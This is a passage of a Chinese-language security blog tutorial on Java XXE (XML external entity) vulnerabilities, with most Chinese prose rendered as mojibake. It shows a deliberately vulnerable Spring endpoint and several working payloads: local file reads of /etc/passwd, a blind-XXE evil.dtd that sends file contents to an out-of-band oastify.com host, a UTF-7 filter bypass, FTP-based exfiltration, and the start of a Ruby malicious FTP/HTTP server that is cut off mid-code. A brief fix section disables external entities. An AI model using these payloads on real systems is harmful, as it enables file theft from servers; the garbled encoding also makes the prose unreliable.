·ï¼Œåœ¨ä½¿ç”¨é»˜è®¤è§£ææ–¹æ³•ä¸”æœªå¯¹XMLè¿›è¡Œè¿‡æ»¤æ—¶ï¼Œå…¶ä¹Ÿä¼šå‡ºç°XXEæ¼æ´ã€‚</p><h4 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h4><p>Digesterç±»ç”¨æ¥å°†XMLæ˜ å°„æˆJavaç±»ï¼Œä»¥ç®€åŒ–XMLçš„å¤„ç†ã€‚å®ƒæ˜¯Apache Commonsåº“ä¸­çš„ä¸€ä¸ªjaråŒ…ï¼šcommon-digesteråŒ…ã€‚ä¸€æ ·çš„åœ¨é»˜è®¤é…ç½®ä¸‹ä¼šå‡ºç°XXEæ¼æ´ã€‚å…¶è§¦å‘çš„XXEæ¼æ´æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬éœ€é€šè¿‡Blind XXEçš„æ–¹æ³•æ¥åˆ©ç”¨</p><h4 id="DocumentBuilderFactory"><a href="#DocumentBuilderFactory" class="headerlink" title="DocumentBuilderFactory"></a>DocumentBuilderFactory</h4><p>javax.xml.parsersåŒ…ä¸­çš„DocumentBuilderFactoryç”¨äºåˆ›å»ºDOMæ¨¡å¼çš„è§£æå™¨å¯¹è±¡ï¼ŒDocumentBuilderFactoryæ˜¯ä¸€ä¸ªæŠ½è±¡å·¥å‚ç±»ï¼Œå®ƒä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†è¯¥ç±»æä¾›äº†ä¸€ä¸ªnewInstance()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šæ ¹æ®æœ¬åœ°å¹³å°é»˜è®¤å®‰è£…çš„è§£æå™¨ï¼Œè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå·¥å‚çš„å¯¹è±¡å¹¶è¿”å›ã€‚</p><p>ç”±ä¸Šè¿°ç±»ä¸æ¥å£çš„åŠŸèƒ½ä¸é…ç½®å†™æ³•å¯çŸ¥ï¼Œå¦‚æœä½¿ç”¨é»˜è®¤çš„å†™æ³•ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼šé€ æˆxxeæ¼æ´çš„</p><p>éœ€è¦ä½¿ç”¨å®‰å…¨å†™æ³•æˆ–æ‰‹åŠ¨è¿‡æ»¤</p><h3 id="æœ‰å›æ˜¾çš„XXE"><a href="#æœ‰å›æ˜¾çš„XXE" class="headerlink" title="æœ‰å›æ˜¾çš„XXE"></a>æœ‰å›æ˜¾çš„XXE</h3><p>æœ€å¼€å§‹æˆ‘ä»¬çœ‹åˆ°çš„ XMLReader ä»£ç ï¼Œä»¥åŠå…¶ä»–çš„ xxxReader ä»£ç ï¼Œéƒ½æ˜¯ä¸å›æ˜¾çš„ï¼Œå› ä¸ºå®ƒä»¬åªæ˜¯å¯¹å†…å®¹è¿›è¡Œäº†è§£æï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¯»å–ä¸è¾“å‡ºã€‚</p><ul><li>å› ä¸º XML ä¹Ÿæ˜¯ååºåˆ—åŒ–çš„ä¸€ç§ï¼Œä¾‹å¦‚å¹³å¸¸çš„ <code>Runtime.getRuntime.exe()</code> æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œå¦‚æœè¦æœ‰å›æ˜¾ï¼Œå¿…é¡»è¦å†™ <code>byte[] code = ...</code> è¿™æ ·å­ï¼ŒæŠŠæœ€åçš„ç»“æœè¯»å–å‡ºæ¥ã€‚</li></ul><h4 id="DocumentBuilder-XXE"><a href="#DocumentBuilder-XXE" class="headerlink" title="DocumentBuilder XXE"></a>DocumentBuilder XXE</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>            <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>            <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br><br>            <span class="hljs-comment">// éå†xmlèŠ‚ç‚¹nameå’Œvalue</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">rootNodeList</span> <span class="hljs-operator">=</span> document.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">rootNode</span> <span class="hljs-operator">=</span> rootNodeList.item(i);<br>                <span class="hljs-type">NodeList</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> rootNode.getChildNodes();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; child.getLength(); j++) &#123;<br>                    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> child.item(j);<br>                    buf.append(String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, node.getNodeName(), node.getTextContent()));<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> buf.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            logger.error(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Drunkbaby</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¯å¢ƒæ­å»ºå‡ºäº†ä¸€äº›é—®é¢˜ï¼Œæµç¨‹åˆ†æå°±ä¸åŠ¨æ€è°ƒè¯•äº†ï¼Œæ‰‹åŠ¨è¿½è¸ªä¸€ä¸‹ä»£ç æ‰§è¡Œæµç¨‹</p><p>åœ¨æ­¤åˆ—å‡ºä¸€äº›æ¯”è¾ƒé‡è¦çš„ä»£ç é‡Šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br></code></pre></td></tr></table></figure><p>å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>DocumentBuilderVuln</code> çš„æ–¹æ³•ï¼Œæ¥æ”¶ <code>HttpServletRequest</code> å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ–°çš„ XML è§£æå™¨å·¥å‚å¯¹è±¡ã€‚</p><p><code>DocumnetBuilderFactory</code> ç±»ç”¨ <code>newInstance()</code> çš„æ–¹å¼è¿›è¡Œå®ä¾‹åŒ–ã€‚æœ¬èº«æŠ½è±¡ç±»æ˜¯ä¸å¯ä»¥å®ä¾‹åŒ–çš„ï¼Œä½†æ˜¯ <code>DocumnetBuilderFactory</code> è‡ªå·±å®šä¹‰äº†ä¸€ä¸ª <code>newInstance()</code> å®ä¾‹åŒ–çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br></code></pre></td></tr></table></figure><p>ä»å·¥å‚ä¸­ç”Ÿæˆä¸€ä¸ª XML è§£æå™¨ï¼ˆDocumentBuilderï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br></code></pre></td></tr></table></figure><p>å°† HTTP è¯·æ±‚ä½“ä½œä¸ºè¾“å…¥æµä¼ å…¥ï¼Œç”¨äºè§£æ XML æ•°æ®ï¼Œå°±æ˜¯è¯»å…¥æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br></code></pre></td></tr></table></figure><p>è§£æ XML æ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ª DOM æ ‘ç»“æ„çš„ <code>Document</code> å¯¹è±¡ã€‚å¼€å§‹ååºåˆ—åŒ–æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> buf.toString();<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†toString()æ–¹æ³•ï¼Œ<mark>è¿”å›äº†æ‹¼å¥½çš„å­—ç¬¦ä¸²</mark>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯æœ‰å›æ˜¾çš„,èƒ½å¤Ÿç”¨æ¥è¯»å–ä¸€äº›æ–‡ä»¶å†…å®¹</p><h3 id="æ— å›æ˜¾çš„XXE"><a href="#æ— å›æ˜¾çš„XXE" class="headerlink" title="æ— å›æ˜¾çš„XXE"></a>æ— å›æ˜¾çš„XXE</h3><p>è¿”å›åŒ…ä¸­æ˜¯çœ‹ä¸åˆ°å­—ç¬¦ä¸²å›æ˜¾çš„</p><p>ä¸€èˆ¬ä½¿ç”¨DNSæ£€æµ‹æ¥æ‰“æ— å›æ˜¾</p><h4 id="XMLReaderï¼ŒSAXBuilderï¼ŒSAXReaderï¼ŒSAXParserï¼ŒDigester-è¿™å‡ ä¸ªå‡½æ•°éƒ½æ˜¯æ— å›æ˜¾çš„"><a href="#XMLReaderï¼ŒSAXBuilderï¼ŒSAXReaderï¼ŒSAXParserï¼ŒDigester-è¿™å‡ ä¸ªå‡½æ•°éƒ½æ˜¯æ— å›æ˜¾çš„" class="headerlink" title="XMLReaderï¼ŒSAXBuilderï¼ŒSAXReaderï¼ŒSAXParserï¼ŒDigester è¿™å‡ ä¸ªå‡½æ•°éƒ½æ˜¯æ— å›æ˜¾çš„"></a>XMLReaderï¼ŒSAXBuilderï¼ŒSAXReaderï¼ŒSAXParserï¼ŒDigester è¿™å‡ ä¸ªå‡½æ•°éƒ½æ˜¯æ— å›æ˜¾çš„</h4><p>æµ‹è¯•xxeæ¼æ´æ˜¯å¦å­˜åœ¨åªéœ€è¦ä½¿ç”¨DNSæ£€æµ‹å³å¯</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zehfrya24b6tjn2oz8w00x6pegk784wt.oastify.com&quot;</span>&gt;</span> ]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨(åˆ©ç”¨dnså¤–å¸¦æ•°æ®)</p><p>å°†ä¸€ä¸ªæ¶æ„çš„DTDæ”¾åœ¨è‡ªå·±çš„vpsä¸Š</p><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br></code></pre></td></tr></table></figure><p>å®ƒå°†è¯»å–æœ¬åœ°æ–‡ä»¶ <code>E:/1.txt</code>ã€‚</p><p>ç„¶åè®¿é—®å¦‚ä¸‹ URLï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=&lt;æ–‡ä»¶å†…å®¹&gt;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å†…å®¹å°±è¿™æ ·æ³„éœ²åˆ°äº†æ”»å‡»è€…æ§åˆ¶çš„åŸŸåã€‚</p><ul><li>åŸç†ä¸Šæ¥è¯´æ˜¯è¿™æ ·çš„ï¼š</li></ul><p>æœ‰æ—¶å€™å¦‚æœ xxe å½“ä¸­å¦‚æœæœåŠ¡ç«¯æ²¡æœ‰æ­£ç¡®å¤„ç†å¥½ä½¿ç”¨ try catchï¼Œé‚£ä¹ˆå¦‚æœæŠ›å‡ºå¼‚å¸¸ Web ç•Œé¢é€šå¸¸ä¼šæ˜¾ç¤ºè¿™ä¸ªé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚æ­¤æ”»å‡»ã€‚</p><p>ä¹‹å‰å®æ“çš„æ—¶å€™æ˜¯èƒ½çœ‹åˆ°ç½‘é¡µå›æ˜¾æ˜¯æœ‰æŠ¥é”™çš„ï¼Œä½†æ˜¯dnså¹³å°æœ‰è®°å½•</p><p>å‘åŒ…æ”»å‡»</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> </span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;http://vpsåœ°å€/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> %remote;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ”»å‡»é¡ºåˆ©æ˜¯èƒ½çœ‹åˆ°è¿”å›çš„dnsè®°å½•ä¸­urlå‚æ•°ä¸­æœ‰x&#x3D;â€¦(æ–‡ä»¶å†…å®¹)</p><p>è¿™é‡Œç¯å¢ƒè°ƒè¯•å‡ºäº†ä¸€äº›é—®é¢˜ï¼Œå¾ˆé—æ†¾æ²¡æœ‰çœ‹åˆ°æˆåŠŸçš„dnså¤–å¸¦æ•°æ®</p><h3 id="XXEæ¼æ´çš„ä¿®å¤"><a href="#XXEæ¼æ´çš„ä¿®å¤" class="headerlink" title="XXEæ¼æ´çš„ä¿®å¤"></a>XXEæ¼æ´çš„ä¿®å¤</h3><p>ä¿®å¤çš„æ‰‹æ®µä¸»è¦å°±æ˜¯ä¸€ç§ï¼šç¦ç”¨å¤–éƒ¨å®ä½“ DTDã€‚å¯¹äºä¸åŒçš„è§£æå™¨æœ‰ä¸åŒçš„ä¿®å¤æ‰‹æ®µã€‚</p><p>(å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºï¼Œç¦æ­¢å¤–éƒ¨å®ä½“ï¼Œé˜²æ­¢å¤–éƒ¨æ¶æ„æ–‡ä»¶åŠ è½½)</p><p>å…³é”®è¯­å¥å°±æ˜¯è¿™ä¸¤å¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">xif</span> <span class="hljs-operator">=</span> XMLInputFactory.newInstance();<br>        <span class="hljs-comment">// ä¸æ”¯æŒå¤–éƒ¨å®ä½“</span><br>       <span class="hljs-comment">// åé¢ä¸¤è¡Œæ˜¯å¤šåŠ çš„ä»£ç  </span><br>        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// ä¸æ”¯æŒdtd</span><br>        xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h3 id="ç»•è¿‡æ‰‹æ³•ä¸trick"><a href="#ç»•è¿‡æ‰‹æ³•ä¸trick" class="headerlink" title="ç»•è¿‡æ‰‹æ³•ä¸trick"></a>ç»•è¿‡æ‰‹æ³•ä¸trick</h3><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span><br>+ADwAIQ-DOCTYPE ANY +AFs-<br>  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-<br>+AF0APg-<br>+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-<br></code></pre></td></tr></table></figure><h4 id="Java-XML-DTD-çš„-trick-åˆ©ç”¨"><a href="#Java-XML-DTD-çš„-trick-åˆ©ç”¨" class="headerlink" title="Java XML DTD çš„ trick åˆ©ç”¨"></a>Java XML DTD çš„ trick åˆ©ç”¨</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">evil</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///&quot;</span> &gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;netdoc://%evil;&#x27;&gt;&quot;</span>&gt;</span><br>%print;<br></code></pre></td></tr></table></figure><h4 id="è§£å†³æ–‡ä»¶è·¨è¡Œä¼ è¾“â€”â€”-ftp-jdk1-7"><a href="#è§£å†³æ–‡ä»¶è·¨è¡Œä¼ è¾“â€”â€”-ftp-jdk1-7" class="headerlink" title="è§£å†³æ–‡ä»¶è·¨è¡Œä¼ è¾“â€”â€” ftp&amp;jdk1.7+"></a>è§£å†³æ–‡ä»¶è·¨è¡Œä¼ è¾“â€”â€” ftp&amp;jdk1.7+</h4><p>çœ‹åˆ°è¿™éƒ¨åˆ†çš„æ—¶å€™è§‰å¾—å¥½å‰å®³ï¼Œå±…ç„¶è¿˜å¯ä»¥è¿™æ ·åš</p><p>åœ¨ XXE ç›²æ³¨ä¸­ï¼Œé€šè¿‡ http åè®®è®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ä¼šåªè·å–è¢«è¯»å–çš„æ–‡ä»¶ç¬¬ä¸€è¡Œã€‚</p><p>åœ¨ jdk1.7 ä»¥å‰ï¼Œå¯ä»¥é€šè¿‡httpåè®®ä¼ è¾“å…·æœ‰æ¢è¡Œçš„æ–‡ä»¶çš„ã€‚å› ä¸ºjavaä¼šå¯¹æ¢è¡Œç¬¦è¿›è¡ŒURLç¼–ç ç„¶åå°±è®¿é—®ä¸€ä¸ªåœ°å€ã€‚</p><p>ä½†æ˜¯1.7ä¹‹åï¼Œå°±ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼Œä¼šæŠ¥é”™ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨ftpæœåŠ¡å™¨æ¥æ¥å—æ¢è¡Œæ–‡ä»¶ï¼Œå› ä¸ºftpæ²¡æœ‰è¿›è¡Œç±»ä¼¼çš„é™åˆ¶ï¼Œæ¢è¡Œä¹‹åçš„å­—ç¬¦ä¼šè¢«å½“åšCWDå‘½ä»¤è¾“å…¥ã€‚</p><p>éœ€è¦èµ·ä¸€ä¸ª<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">æ¶æ„çš„FTPæœåŠ¡å™¨</a>ï¼Œå…¶ä»–æŒ‰ç…§æ­£å¸¸çš„XXEç›²æ³¨æ‰“ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XMl"><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % c <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#x27;ftp://127.0.0.1:2121/%b;&#x27;&gt;&quot;</span>&gt;</span><br>%c;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">asd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8088/&quot;</span>&gt;</span> </span><br><span class="hljs-meta">   %asd; </span><br><span class="hljs-meta">   %rrr; </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ftp-server</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">require <span class="hljs-string">&#x27;socket&#x27;</span><br><br>ftp_server = TCPServer.new <span class="hljs-number">2121</span><br>http_server = TCPServer.new <span class="hljs-number">8088</span><br><br><span class="hljs-built_in">log</span> = File.open( <span class="hljs-string">&quot;xxe-ftp.log&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&lt;!ENTITY % b SYSTEM &quot;file:///tmp/1.txt&quot;&gt;</span><br><span class="hljs-string">           &lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM \&#x27;</span>ftp:<span class="hljs-comment">//127.0.0.1:2121/%b;\&#x27;&gt;&quot;&gt;</span><br>           %c;&#x27;<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(http_server.accept) <span class="hljs-keyword">do</span> |http_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. New client connected&quot;</span><br>loop &#123;<br>req = http_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-keyword">if</span> req.start_with? <span class="hljs-string">&quot;GET&quot;</span><br>http_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nContent-length: #&#123;payload.length&#125;\r\n\r\n#&#123;payload&#125;&quot;</span>)<br>end<br><span class="hljs-built_in">puts</span> req<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. Connection closed&quot;</span><br>  end<br>end<br><br>end<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(ftp_server.accept) <span class="hljs-keyword">do</span> |ftp_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. New client 